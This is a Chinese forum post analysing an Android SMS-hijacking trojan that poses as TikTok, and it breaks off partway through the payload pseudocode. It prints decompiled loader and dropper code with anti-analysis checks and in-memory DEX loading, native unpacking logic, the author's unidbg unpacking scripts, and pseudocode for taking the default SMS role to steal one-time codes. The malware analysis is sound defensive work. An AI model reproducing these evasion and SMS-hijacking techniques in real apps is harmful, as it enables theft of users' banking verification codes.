---
title: '[原创]某Android SMS 木马逆向分析'
url: https://bbs.kanxue.com/thread-291907.htm
tid: 291907
author: ldz666
date: '2026-07-07'
tags: [Android安全, 原创, 逆向分析, 脱壳反混淆]
crawled_at: '2026-07-31T13:50:21+08:00'
replies: 6
---

# 0x0 前言

最近实习主要在做Android的逆向和动态下发分析相关的工作，因此在业余时间找了一个真实的木马样本进行分析，IOC在威胁情报平台上尚无匹配记录，暂无法归属到已知木马家族。经过完整分析后发现，该样本的技术复杂度较简单。本文也被发到我的公众号上，欢迎各为移步：<https://mp.weixin.qq.com/s/clCb7TEeSH3ruwLSjqnjxA>

```
样本来源: MalwareBazaar（https://bazaar.abuse.ch/sample/388d7fd938e51455ad9ba27eae9ce01fcbadff8ab88d5a7e9e742cb28402f1e8/）
SHA256: 388d7fd938e51455ad9ba27eae9ce01fcbadff8ab88d5a7e9e742cb28402f1e8
文件名: ????????????????????????_????????????????????????????????.apk
伪装目标: TikTok 官方应用
文件大小: 7,016,188 Bytes（约 6.69 MB）
首次发现时间: 2026-07-02 12:57:38 UTC
标签: android、apk、banker、dropper、malware、RiskWare、signed、Tiktok
样本行为: Android 银行木马投递器（Dropper），通过伪装为 TikTok 应用诱导用户安装，安装后用于投递或加载恶意载荷，可能进一步实施银行凭据窃取、敏感信息收集、权限滥用及其他恶意活动。
伪装说明: 使用 TikTok 的名称或图标进行伪装，以提高用户信任度并诱骗安装恶意 APK。
```

本文针对一种比较新的（26年7月） Android SMS 劫持恶意软件开展逆向分析，完整还原了其 Loader、安装器及最终  Payload 的执行流程，分析了动态解密、内存加载、JNI 解包、DoH  获取配置、默认短信应用劫持及短信监听等关键技术，最终确定该样本属于以短信验证码（OTP）窃取为核心的 Android SMS Hijacking  恶意软件，具有多层加载、组件动态启用、官方 DoH 隐蔽通信以及 Builder 自动化生成等典型特征。

# 0x1 Loader脱壳

首先看`AndroidManifest.xml`，应用定义如下。

```
<application
        android:theme="@style/Theme.Downloader"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:name="com.supuyami.xajijupuqi.PewozipuluraApp_ff92"
```

同时 `attachBaseContext` 方法被重写，结合`Jadx`反编译结果，推测样本使用了加壳保护。

```
protected void attachBaseContext(Context context) {
        int iNativeLiteCheck;
        super.attachBaseContext(context);
        Log.i(TAG, "attachBaseContext start");
        try {
            iNativeLiteCheck = nativeLiteCheck(); // 反调Java_com_supuyami_xajijupuqi_PewozipuluraApp_1ff92_nativeLiteCheck from libpmdkzpc.so
        } catch (Throwable th) {
            iNativeLiteCheck = 0;
        }
        try {
            if (iNativeLiteCheck == 3) {
                Log.i(TAG, "silent block: liteResult=3");
                return;    // 直接退出
            }
            EnvResult envResultBuildEnvReport = buildEnvReport(context, iNativeLiteCheck);
            // 收集当前设备环境信息，判断设备是否属于"机器人/模拟器/自动化环境"
            if (envResultBuildEnvReport.blocked) {
                Log.i(TAG, "blocked: " + (envResultBuildEnvReport.silent ? "silent" : "sending report"));
                if (!envResultBuildEnvReport.silent) {
                    sendReportAsync(envResultBuildEnvReport.report); // 上报
                }
                launchDecoy(context);
                return;
            }
            byte[] bArrNativeUnpack = nativeUnpack(); // 脱壳代码Java_com_supuyami_xajijupuqi_PewozipuluraApp_1ff92_nativeUnpack from libpmdkzpc.so
            if (bArrNativeUnpack != null && bArrNativeUnpack.length >= 32) { // 解压长度成功？
                Log.i(TAG, "nativeUnpack OK: len=" + bArrNativeUnpack.length);
                ClassLoader classLoader = getClass().getClassLoader();
                InMemoryDexClassLoader inMemoryDexClassLoader = new InMemoryDexClassLoader(ByteBuffer.wrap(bArrNativeUnpack), classLoader);
                copyNativeLibraryDirs(classLoader, inMemoryDexClassLoader);
                replaceClassLoader(context, inMemoryDexClassLoader);
                Log.i(TAG, "classloader replaced: " + inMemoryDexClassLoader.getClass().getSimpleName()); // 替换 DexLoader
                try {
                    context.getResources();
                } catch (Throwable th2) {
                }
                try {
                    getResources(); // 变量缓存刷新
                    return;
                } catch (Throwable th3) {
                    return;
                }
            }
            Log.e(TAG, "nativeUnpack failed: len=" + (bArrNativeUnpack == null ? -1 : bArrNativeUnpack.length)); // 错误处理：脱壳失败
        } catch (Throwable th4) {
            Log.e(TAG, "attachBaseContext error: " + th4);
        } // 错误处理：异常退出
    }
```

其中对应风控模块的`buildEnvReport`里面包含大量俄语字符串，可以初步判断该样本可能来自俄语地区的威胁团伙。

在56.al平台尝试自动脱壳，但任务异常失败，报错如下。因此只能采用手动脱壳方式。

![image](https://bbs.kanxue.com/upload/attach/202607/996388_9VF4CPYWW46MCMK.webp)![image-20260704082625614](https://bbs.kanxue.com/upload/attach/202607/VGAZ38QA5ZPYK4G.jpg)![image](https://bbs.kanxue.com/upload/attach/202607/VGAZ38QA5ZPYK4G.jpg)

脱壳对应的函数是`nativeUnpack`，位于`libpmdkzpc.so`，该函数未使用额外的代码混淆，核心逻辑如下。

```
AAssetManager *__fastcall Java_com_supuyami_xajijupuqi_PewozipuluraApp_1ff92_nativeUnpack(JNIEnv *a1, void *a2){
  AAssetManager *result; // x0
  AAssetManager *v5; // x20
  AAsset *v6; // x21

  v52 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);
  result = (AAssetManager *)((__int64 (__fastcall *)(JNIEnv *))(*a1)->GetObjectClass)(a1);
  if ( result )
  {
    result = (*a1)->GetMethodID(a1, result, "getAssets", "()Landroid/content/res/AssetManager;");
    if ( result )
    {
      result = (AAssetManager *)(*a1)->CallObjectMethod(a1, a2, result);
      if ( result )
      {
        result = AAssetManager_fromJava(a1, result);
        if ( result )
        {
          v5 = result;
          result = AAssetManager_open(result, "hlqudr/tfuvugxs.cache", 3);
          if ( result )
          {
            v6 = result;
            Length = AAsset_getLength(result);
            if ( Length <= 0 || (v8 = Length, (v9 = (int8x16_t *)malloc(Length)) == 0LL) )
            {
              AAsset_close(v6);
              return 0LL;
            }
            v10 = v9;
            v11 = AAsset_read(v6, v9, v8);
            AAsset_close(v6);
            if ( v11 == (_DWORD)v8 )
            {
              v12 = AAssetManager_open(v5, "hlqudr/cphxetqa.tmp", 3);
              if ( v12 )
              {
                v13 = v12;
                v14 = AAsset_getLength(v12);
                v15 = v14;
                if ( v14 < 1 )
                {
                  v17 = 0LL;
LABEL_23:
                  AAsset_close(v13);
                  free(v10);
                  if ( v15 >= 1 )
                  {
                    v28 = v17;
LABEL_27:
                    free(v28);
                  }
                  return 0LL;
                }
                v16 = (int8x16_t *)malloc(v14);
                if ( v16 )
                {
                  v17 = v16;
                  v18 = AAsset_read(v13, v16, v15);
                  AAsset_close(v13);
                  if ( v18 != (_DWORD)v15 )
                  {
                    v23 = 0LL;
                    goto LABEL_31;
                  }
                  v19 = AAssetManager_open(v5, "hlqudr/yccfliek.bin", 3);
                  if ( !v19 )
                  {
LABEL_34:
                    free(v10);
                    v28 = v17;
                    goto LABEL_27;
                  }
                  v13 = v19;
                  v20 = AAsset_getLength(v19);
                  if ( v20 >= 1 )
                  {
                    v21 = v20;
                    v22 = (int8x16_t *)malloc(v20);
                    if ( v22 )
                    {
                      v23 = v22;
                      v43 = AAsset_read(v13, v22, v21);
                      AAsset_close(v13);
                      if ( v43 == (_DWORD)v21 )
                      {
                        v24 = v21 + v15 + v8;
                        v25 = (int8x16_t *)malloc(v24);
                        if ( !v25 )
                        {
                          free(v10);
                          free(v17);
                          v28 = v23;
                          goto LABEL_27;
...
```

该 JNI 函数首先通过 `AssetManager` 从 APK 的 `assets` 目录依次读取三个资源文件（`hlqudr/tfuvugxs.cache`、`hlqudr/cphxetqa.tmp`、`hlqudr/yccfliek.bin`），将其内容按顺序拼接到一块连续缓冲区中。随后使用一个 32 字节循环密钥对拼接后的数据执行 XOR 解密，完成解密后，函数调用 zlib 的 `inflate` 接口对数据进行解压。在输出缓冲区不足时会自动扩容并重新解压，最终将还原得到的原始 Dex 数据封装为 Java 层的 `byte[]` 返回。

接下来编写 Unidbg 脚本模拟执行：

```
public static void main(String[] args) throws IOException {
    final DemoUnidbg demo = new DemoUnidbg();
    demo.traceCode(); // hook assembly
    demo.callnativeUnpack();
}
public DemoUnidbg() throws IOException {
    emulator = AndroidEmulatorBuilder
        .for64Bit()
        .setProcessName("com.zhiliaoapp.musically")
        .addBackendFactory(new Unicorn2Factory(true))
        .build();
    Memory memory = emulator.getMemory();
    memory.setLibraryResolver(new AndroidResolver(23));
    vm = emulator.createDalvikVM(new File("/home/ldz/unidbg-0.9.8/target/tiktok.apk"));
    vm.setVerbose(true);
    vm.setJni(this);
    new FixedAndroidModule(emulator, vm).register(memory);
    dm = vm.loadLibrary(new File("/home/ldz/unidbg-0.9.8/target/arm64-v8a/libpmdkzpc.so"), true);
    module = dm.getModule();
}
```

报错如下：

```
[+] 开始步入 Native 函数...
JNIEnv->GetMethodID(com/supuyami/xajijupuqi/PewozipuluraApp_ff92.getAssets()Landroid/content/res/AssetManager;) => 0x7ea19d1d was called from RX@0x40001ed8[libpmdkzpc.so]0x1ed8
[09:07:05 485]  WARN [com.github.unidbg.linux.ARM64SyscallHandler] (ARM64SyscallHandler:412) - handleInterrupt intno=2, NR=-130448, svcNumber=0x11e, PC=unidbg@0xfffe0274, LR=RX@0x40001ef4[libpmdkzpc.so]0x1ef4, syscall=null
java.lang.UnsupportedOperationException: com/supuyami/xajijupuqi/PewozipuluraApp_ff92->getAssets()Landroid/content/res/AssetManager;
    at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:933)
    at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:867)
    at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethod(DvmMethod.java:69)
    at com.github.unidbg.linux.android.dvm.DalvikVM64$31.handle(DalvikVM64.java:533)
    at com.github.unidbg.linux.ARM64SyscallHandler.hook(ARM64SyscallHandler.java:121)
    at com.github.unidbg.arm.backend.Unicorn2Backend$11.hook(Unicorn2Backend.java:352)
    at com.github.unidbg.arm.backend.unicorn.Unicorn$NewHook.onInterrupt(Unicorn.java:109)
    at com.github.unidbg.arm.backend.unicorn.Unicorn.emu_start(Native Method)
```

补全 JNI 方法实现：

```
@Override
public DvmObject<?> callObjectMethodV(BaseVM vm, DvmObject<?> dvmObject, String signature, VaList vaList) {
    // 拦截 getAssets()Landroid/content/res/AssetManager; 的调用
    if ("java/lang/Class->getAssets()Landroid/content/res/AssetManager;".equals(signature) ||
"com/supuyami/xajijupuqi/PewozipuluraApp_ff92-        >getAssets()Landroid/content/res/AssetManager;".equals(signature)) {
        return vm.resolveClass("android/content/res/AssetManager").newObject(null);
    }

    return super.callObjectMethodV(vm, dvmObject, signature, vaList);
}

@Override
public DvmObject<?> callObjectMethod(BaseVM vm, DvmObject<?> dvmObject, String signature, VarArg varArg) {
    if ("java/lang/Class->getAssets()Landroid/content/res/AssetManager;".equals(signature) ||
"com/supuyami/xajijupuqi/PewozipuluraApp_ff92->getAssets()Landroid/content/res/AssetManager;".equals(signature)) {
        return vm.resolveClass("android/content/res/AssetManager").newObject(null);
    }
    return super.callObjectMethod(vm, dvmObject, signature, varArg);
}
```

报错如下：

```
INFO [com.github.unidbg.linux.AndroidElfLoader] (AndroidElfLoader:481) - libpmdkzpc.so load dependency libandroid.so failed
...
0x4000239C (+0x239C): br       x17
[09:18:22 966]  WARN [com.github.unidbg.arm.AbstractARM64Emulator] (AbstractARM64Emulator$1:66) - Fetch memory failed: address=0x2340, size=4, value=0x0
[09:18:22 967]  WARN [com.github.unidbg.AbstractEmulator] (AbstractEmulator:417) - emulate RX@0x40001e70[libpmdkzpc.so]0x1e70 exception sp=unidbg@0xbffff620, msg=unicorn.UnicornException: Invalid memory fetch (UC_ERR_FETCH_UNMAPPED), offset=16ms @ Runnable|Function64 address=0x40001e70, arguments=[unidbg@0xfffe1640, 433874882]
[+] 调用完成。返回值为: -1
```

缺少`libandroid.so`及对应的`AAssetManager_fromJava`等函数，需要使用`VirtualModule`补全运行环境。

```
static class FixedAndroidModule extends VirtualModule<VM> {
        FixedAndroidModule(Emulator<?> emulator, VM vm) {
            super(emulator, vm, "libandroid.so");
        }
        @Override
        protected void onInitialize(Emulator<?> emulator, VM vm, Map<String, UnidbgPointer> symbols) {
            SvcMemory svcMemory = emulator.getSvcMemory();
            symbols.put("AAssetManager_fromJava", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    UnidbgPointer assetManager = context.getPointerArg(1);
                    vm.getObject(assetManager.toIntPeer());
                    return assetManager.peer;
                }}));
            symbols.put("AAssetManager_open", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    String filename = context.getPointerArg(1).getString(0);
                    System.out.println("AAssetManager_open: " + filename);
                    try {
                        Path path = Paths.get(
                                "/home/ldz/unidbg-0.9.8/target/tiktok/assets",
                                filename
                        );
                        if (!Files.exists(path)) {
                            System.out.println("asset not found: " + path);
                            return 0;
                        }
                        byte[] data = Files.readAllBytes(path);
                        Asset asset = new Asset(vm, filename);
                        asset.open(emulator, data);
                        return vm.addLocalObject(asset);
                    } catch (IOException e) {
                        e.printStackTrace();
                        return 0;
                    }
                }}));
            symbols.put("AAsset_getLength", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    UnidbgPointer pointer = context.getPointerArg(0);
                    Asset asset = vm.getObject(pointer.toIntPeer());
                    return asset.getLength();
                }}));
            symbols.put("AAsset_close", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    UnidbgPointer pointer = context.getPointerArg(0);
                    Asset asset = vm.getObject(pointer.toIntPeer());
                    asset.close();
                    return 0;
                }}));
            symbols.put("AAsset_getBuffer", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    UnidbgPointer pointer = context.getPointerArg(0);
                    Asset asset = vm.getObject(pointer.toIntPeer());
                    return asset.getBuffer().peer;
                }}));
            symbols.put("AAsset_read", svcMemory.registerSvc(new Arm64Svc() {
                @Override
                public long handle(Emulator<?> emulator) {
                    RegisterContext context = emulator.getContext();
                    UnidbgPointer pointer = context.getPointerArg(0);
                    Pointer buf = context.getPointerArg(1);
                    int count = context.getIntArg(2);
                    Asset asset = vm.getObject(pointer.toIntPeer());
                    byte[] bytes = asset.read(count);
                    buf.write(0, bytes, 0, bytes.length);
                    return bytes.length;
                }}));
        }
    }
```

运行后成功将内容 dump 为 Dex 文件，使用 Jadx 打开可以正常反编译。

![image-20260704105547257](https://bbs.kanxue.com/upload/attach/202607/VGAZ38QA5ZPYK4G.jpg)![image](https://bbs.kanxue.com/upload/attach/202607/996388_DR2MVWWWTB29FSM.webp)

分析发现，该 Dex 文件主要实现了 VPN 功能和动态安装 APK 的逻辑。

# 0x2 Installer脱壳

我们可以在`com.supuyami.xajijupuqi`包的`SuseqarolimoActivity_b320`类（启动 Activity）中看到`onCreate`方法的核心逻辑：

```
public void onCreate(Bundle bundle) {
        if (AppCompatDelegate.leqoje != 1) {
            AppCompatDelegate.leqoje = 1;
            synchronized (AppCompatDelegate.xedirefu) {
                try {
                    rigi.Lemitege<WeakReference<AppCompatDelegate>> lemitege = AppCompatDelegate.jijiwudase;
                    lemitege.getClass();
                    Lemitege.Cekuwigupega cekuwigupega = new Lemitege.Cekuwigupega();
                    while (cekuwigupega.hasNext()) {
                        AppCompatDelegate appCompatDelegate = (AppCompatDelegate) ((WeakReference) cekuwigupega.next()).get();
                        if (appCompatDelegate != null) {
                            appCompatDelegate.zavahu();
                        }
                    }
                } finally {
                }
            }
        } // 强制关闭深色模式
        super.onCreate(bundle);
        ActivityMainBinding activityMainBindingInflate = ActivityMainBinding.inflate(getLayoutInflater());
        this.binding = activityMainBindingInflate;
        if (activityMainBindingInflate == null) {
            Intrinsics.hesezewi("binding");
            throw null;
        } // 刷新所有Activity主题
        setContentView(activityMainBindingInflate.gimi);
        WindowCompat.gimi(getWindow());
        getWindow().setStatusBarColor(0);
        getWindow().setNavigationBarColor(0);
        boolean z = (getResources().getConfiguration().uiMode & 48) == 32;
        Window window = getWindow();
        getWindow().getDecorView();
        WindowInsetsControllerCompat windowInsetsControllerCompat = new WindowInsetsControllerCompat(window);
        boolean z2 = !z;
        windowInsetsControllerCompat.qebuhu(z2);
        windowInsetsControllerCompat.gimi(z2);
        setupWebView(); // 设置为tiktok启动页面，让用户觉得正在启动tiktok
        ContextCompat.gimi(this, this.installStartedReceiver, new IntentFilter(KazulijepaService_148a.ACTION_INSTALL_STARTED)); // 监听安装开始
        ContextCompat.gimi(this, this.permissionGrantedReceiver, new IntentFilter(WunamuvuxariduqeMonitor_8e3f.ACTION_UNKNOWN_SOURCES_GRANTED)); // 安装权限是否通过
        ContextCompat.gimi(this, this.installFinishedReceiver, new IntentFilter(DowuharoquReceiver_7c3e.ACTION_CRISTOFER_INSTALLED)); // 是否安装成功
        ContextCompat.gimi(this, this.vpnReadyReceiver, new IntentFilter("a.dfdywgpq.fpyc"));
        if (checkIfPayloadInstalled()) { // payload是否安装
            return; // 安装则返回
        }
        preparePayload(); // 安装payload
    }

    private final void preparePayload() {
        BuildersKt.gimi(CoroutineScopeKt.gimi(Dispatchers.qebuhu), new Najohigeca(null));
    } // 利用 Kotlin 的协程（Coroutines）异步开启了一个后台任务，在后台静默下载或解密并强行安装 Payload。
```

下载`Payload`的逻辑位于`Najohigeca`类的`invokeSuspend`方法下，混淆后对应的名称是`hesezewi`，主要逻辑位于`case 0`分支。动态加载流程如下：

```
onCreate()
↓
checkIfPayloadInstalled() ← 检查TikTok是否已安装
↓ (未安装)
preparePayload()
↓
m_ziutteqo(assets, "jurmyjdt.bin", cachePath) ← Native解密
↓
m_lscjkcya(originalPkg) ← 生成新包名
↓
patchPackageName(oldApk, newApk, oldPkg, newPkg) ← 修改包名
↓
m_clpdouaj(apkPath) ← 最终处理
↓
signApkInPlace(apkPath) ← 重签名
↓
runInstallService() ← 启动安装
```

其中，`m_ziutteqo`方法在`libqbflddv.so`中通过 JNI 动态注册，我们可以使用 Unidbg 模拟执行该方法。

```
JNIEnv->FindClass(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320) was called from RX@0x4004eda8[libqbflddv.so]0x4eda8
JNIEnv->RegisterNatives(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, unidbg@0xbffff630, 5) was called from RX@0x4004f084[libqbflddv.so]0x4f084
RegisterNative(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, m_ziutteqo(Landroid/content/res/AssetManager;Ljava/lang/String;Ljava/lang/String;)Z, RX@0x4004ca88[libqbflddv.so]0x4ca88)
RegisterNative(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, m_nuiwgchk(Ljava/lang/String;)Z, RX@0x4004d7b4[libqbflddv.so]0x4d7b4)
RegisterNative(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, m_clpdouaj(Ljava/lang/String;)Z, RX@0x4004e000[libqbflddv.so]0x4e000)
RegisterNative(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, m_lscjkcya(Ljava/lang/String;)Ljava/lang/String;, RX@0x4004e06c[libqbflddv.so]0x4e06c)
RegisterNative(com/supuyami/xajijupuqi/SuseqarolimoActivity_b320, m_gldbmkvh(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z, RX@0x4004e3d4[libqbflddv.so]0x4e3d4)
JNIEnv->FindClass(com/supuyami/xajijupuqi/QevobufiyoruChecker_fa40) was called from RX@0x4004f0c0[libqbflddv.so]0x4f0c0
JNIEnv->RegisterNatives(com/supuyami/xajijupuqi/QevobufiyoruChecker_fa40, unidbg@0xbffff630, 3) was called from RX@0x4004f28c[libqbflddv.so]0x4f28c
RegisterNative(com/supuyami/xajijupuqi/QevobufiyoruChecker_fa40, m_brafwpmv()Z, RX@0x4004f418[libqbflddv.so]0x4f418)
RegisterNative(com/supuyami/xajijupuqi/QevobufiyoruChecker_fa40, m_whcmcvzy()Z, RX@0x4004f590[libqbflddv.so]0x4f590)
RegisterNative(com/supuyami/xajijupuqi/QevobufiyoruChecker_fa40, m_fdwgntut()Z, RX@0x4004fde0[libqbflddv.so]0x4fde0)
```

其中`m_ziutteqo`对应的偏移地址是`0x4ca88`，可以直接模拟执行获取目标 APK 文件。执行过程无报错，代码如下：

```
private void callUnpackApk() throws IOException {
        // Function address for sub_4CA88
        long FuncAddr = 0x4CA88;

        // Prepare the output file path - use a simple path that unidbg can write to
        String outputPath = "/data/local/tmp/unpacked.apk";
        String realOutputPath = "/home/ldz/unidbg-0.9.8/unpacked.apk";

        System.out.println("[+] Starting APK unpack...");
        System.out.println("[+] Asset file: jurmyjdt.bin");
        System.out.println("[+] Output path (virtual): " + outputPath);
        System.out.println("[+] Output path (real): " + realOutputPath);

        // Get AssetManager
        DvmObject<?> assetManager = vm.resolveClass("android/content/res/AssetManager").newObject(null);

        // Prepare parameters for direct function call
        Pointer jniEnv = vm.getJNIEnv();
        int assetManagerHandle = vm.addLocalObject(assetManager);

        // Create Java string objects
        StringObject assetFileName = new StringObject(vm, "jurmyjdt.bin");
        StringObject outputPathStr = new StringObject(vm, outputPath);
        int assetFileHandle = vm.addLocalObject(assetFileName);
        int outputPathHandle = vm.addLocalObject(outputPathStr);

        // Call the native function directly
        System.out.println("[+] Calling native function sub_4CA88...");
        List<Object> args = new ArrayList<>();
        args.add(jniEnv);              // X0: JNIEnv*
        args.add(0);                   // X1: jclass (can be 0 for non-static)
        args.add(assetManagerHandle);  // X2: AssetManager jobject
        args.add(assetFileHandle);     // X3: filename jstring
        args.add(outputPathHandle);    // X4: output path jstring

        Number result = module.callFunction(emulator, FuncAddr, args.toArray());

        System.out.println("[+] Native call completed. Return value: " + result.intValue());

        // Try to read the file from unidbg's virtual filesystem
        if (result.intValue() == 1) {
            try {
                com.github.unidbg.file.FileResult fileResult =
                    emulator.getFileSystem().open(outputPath, com.github.unidbg.file.linux.IOConstants.O_RDONLY);

                if (fileResult != null && fileResult.isSuccess()) {
                    com.github.unidbg.file.linux.AndroidFileIO fileIO =
                        (com.github.unidbg.file.linux.AndroidFileIO) fileResult.io;

                    // Seek to end to get file size
                    long fileSize = fileIO.lseek(0, 2);  // SEEK_END = 2
                    fileIO.lseek(0, 0);  // SEEK_SET = 0

                    // Allocate memory and read
                    Memory memory = emulator.getMemory();
                    UnidbgPointer buffer = memory.malloc((int)fileSize, false).getPointer();
                    int bytesRead = fileIO.read(emulator.getBackend(), buffer, (int)fileSize);

                    // Copy to byte array
                    byte[] data = buffer.getByteArray(0, bytesRead);
                    fileIO.close();

                    // Write to real filesystem
                    Files.write(Paths.get(realOutputPath), data);

                    System.out.println("[+] Success! APK unpacked and saved to: " + realOutputPath);
                    System.out.println("[+] File size: " + bytesRead + " bytes");
                } else {
                    System.out.println("[-] Could not open file from virtual filesystem");
                }
            } catch (Exception e) {
                System.out.println("[-] Error reading from virtual filesystem: " + e.getMessage());
                e.printStackTrace();
            }
        } else {
            System.out.println("[-] Native function returned failure");
        }
    }
```

# 0x3 Dropper分析

其整体执行流程如图所示。

```
Application.attachBaseContext()
        │
        ▼
环境检测
(Bot检测、安装环境检测)
        │
        ▼
JNI解密(libldcaeux.so::fllzsswi)
        │
        ▼
InMemoryDexClassLoader
动态加载Dex
        │
        ▼
替换Application/ClassLoader
        │
        ▼
启动真实Payload
```

该 APK 的入口类为 `GexojofiApp51ef`，其重写了 `Application.attachBaseContext()` 方法，并在应用生命周期最早阶段执行全部初始化逻辑。与第一层 Loader 相同，该样本再次采用 Native 代码完成解密，其中核心函数 `fllzsswi()` 位于 `libldcaeux.so` 中，其返回值为解密后的 DEX 字节流。当检测失败时，程序不会继续执行恶意逻辑，而是启动 `QibabumupayipeAuth76ed` Activity，仅显示一个 **Loading...** 界面，并禁止用户返回，从而制造程序仍在正常启动的假象，同时避免恶意逻辑暴露给分析环境。

脱壳函数`fllzsswi`位于`libldcaeux.so`中，代码逻辑如下：

```
   @Override // android.content.ContextWrapper
    protected void attachBaseContext(Context context) {
        int iGafunerz;
        ClassLoader dexClassLoader;
        super.attachBaseContext(context);
        boolean zHasBotPackage = hasBotPackage(context);
        boolean z = !zHasBotPackage && isTooFewUserApps(context);
        boolean z2 = (zHasBotPackage || z || !isSuspiciousInstallTimes(context)) ? false : true;
        if (zHasBotPackage || z || z2) {
            iGafunerz = 0;
        } else {
            try {
                iGafunerz = gafunerz();
            } catch (Throwable unused) {
                iGafunerz = 0;
            }
        }
        if (zHasBotPackage || z || z2) {
            return;
        }
        if (iGafunerz != 0) {
            if (iGafunerz != 3) {
                try {
                    Intent intent = new Intent();
                    intent.setClassName(context.getPackageName(), "com.vuxewo.sonaqu.QibabumupayipeAuth76ed");
                    intent.addFlags(268468224);
                    context.startActivity(intent);
                    return;
                } catch (Throwable unused2) {
                    return;
                }
            }
            return;
        }
        try {
            byte[] bArrFllzsswi = fllzsswi();
            if (bArrFllzsswi != null && bArrFllzsswi.length >= 32) {
                ClassLoader classLoader = getClassLoader();
                if (Build.VERSION.SDK_INT >= 26) {
                    dexClassLoader = new InMemoryDexClassLoader(ByteBuffer.wrap(bArrFllzsswi), classLoader);
                } else {
                    File file = new File(context.getCacheDir(), ".dx");
                    FileOutputStream fileOutputStream = new FileOutputStream(file);
                    fileOutputStream.write(bArrFllzsswi);
                    fileOutputStream.close();
                    File file2 = new File(context.getCacheDir(), ".dxopt");
                    file2.mkdirs();
                    dexClassLoader = new DexClassLoader(file.getAbsolutePath(), file2.getAbsolutePath(), null, classLoader);
                }
                copyNativeLibDirs(classLoader, dexClassLoader);
                swapClassLoader(context, dexClassLoader);
                Application application = (Application) dexClassLoader.loadClass("com.vuxewo.sonaqu.WivinotazozajoApplication_bd4d").getDeclaredConstructor(new Class[0]).newInstance(new Object[0]);
                Method declaredMethod = ContextWrapper.class.getDeclaredMethod("attachBaseContext", Context.class);
                declaredMethod.setAccessible(true);
                declaredMethod.invoke(application, context);
                swapApp(context, application);
                this.realApp = application;
            }
        } catch (Throwable unused3) {
        }
    }
```

参照第一节的脱壳方法进行修改，即可成功获得最终的 Dex 文件（恶意载荷）。

# 0x4 Payload恶意行为分析

恶意载荷请求了大量敏感权限，主要集中在短信和通话相关功能：

| 权限 | 作用 | 风险 |
|-|-|-|
| `AUTHENTICATE_ACCOUNTS` | 创建账户 | 创建账户、同步账户、修改账户密码 |
| `CALL_PHONE` | 电话呼叫 | 任意拨号、查询余额 |
| `READ_SMS` | 读取所有短信 | 可读取验证码、银行短信、通知短信等 |
| `SEND_SMS` | 发送短信 | 可发送扣费短信、向攻击者发送数据 |
| `RECEIVE_SMS` | 接收短信广播 | 可第一时间获知新短信 |
| `RECEIVE_MMS` | 接收彩信 | 可监控彩信 |
| `RECEIVE_WAP_PUSH` | 接收运营商 Push | 较少使用 |

权限请求流程的伪代码如下：

```
  初始化阶段:
  ├── onCreate()
  │   ├── 检查是否已完成设置（避免重复运行）
  │   ├── 显示假的骨架屏UI（迷惑用户）
  │   └── 启动权限请求流程
  │
  权限请求流程:
  ├── 1. 请求SMS权限（READ_SMS, SEND_SMS, RECEIVE_SMS）
  │   ├── 成功 → 继续
  │   └── 失败 → 重试（最多3次）+ 显示Toast警告
  │
  ├── 2. 请求电话权限（READ_CALL_LOG, CALL_PHONE, READ_PHONE_STATE）
  │   ├── 成功 → 继续
  │   └── 失败 → 重试（最多3次）
  │
  ├── 3. 请求成为默认SMS应用（关键！）
  │   ├── Android 15小米设备 → 使用特殊Intent跳转小米权限页面
  │   ├── Android 10+ → 使用RoleManager.createRequestRoleIntent("android.app.role.SMS")
  │   ├── Android < 10 → 使用旧版SMS默认应用API
  │   ├── 成功 → 继续
  │   └── 失败 → 重试（最多2次）
  │
  权限获取后:
  ├── activateCoreFunctionality() - 启用隐藏的17个恶意组件
  │   ├── DuhidewupuwoReceiver_54cf（广播接收器）
  │   ├── CigamezujudiReceiver_516d
  │   ├── 多个后台Service
  │   └── 使用setComponentEnabledSetting()动态启用
  │
  ├── startCoreServices() - 启动恶意服务
  │   ├── startAllServices() - 启动前台服务
  │   ├── scheduleWorker() - 每30秒执行一次的定时任务
  │   └── createSyncAccount() - 创建同步账户
  │
  ├── requestBatteryOptimization() - 请求电池白名单
  │   └── Intent: ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
  │
  ├── requestNotificationPermission() - 请求通知权限
  │   └── 检查是否在enabled_notification_listeners中
  │
  └── launchExternalBrowserAndFinish()
      ├── 打开的是一个 Google 搜索页面
      ├── 保存设置完成标志
      └── finishAndRemoveTask() - 从任务列表中移除
```

核心伪代码：

```
  class MalwareActivity:
      def onCreate():
          if already_setup_complete():
              finish()
              return
      show_fake_skeleton_ui()  # 显示假UI迷惑用户
      start_permission_flow()

  def start_permission_flow():
      # 第一步：请求SMS权限
      permissions = ["READ_SMS", "SEND_SMS", "RECEIVE_SMS"]
      request_permissions(permissions)
      # 回调 → requestPhonePermissions()

  def requestPhonePermissions():
      # 第二步：请求电话权限
      permissions = ["READ_CALL_LOG", "CALL_PHONE", "READ_PHONE_STATE"]
      request_permissions(permissions)
      # 回调 → requestSmsRole()

  def requestSmsRole():
      # 第三步：成为默认SMS应用（关键！）
      if Android >= 10:
          roleManager = getSystemService(ROLE_SERVICE)
          intent = roleManager.createRequestRoleIntent("android.app.role.SMS")
          startActivityForResult(intent)
      else:
          # 旧版本使用旧API
          intent = Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT")
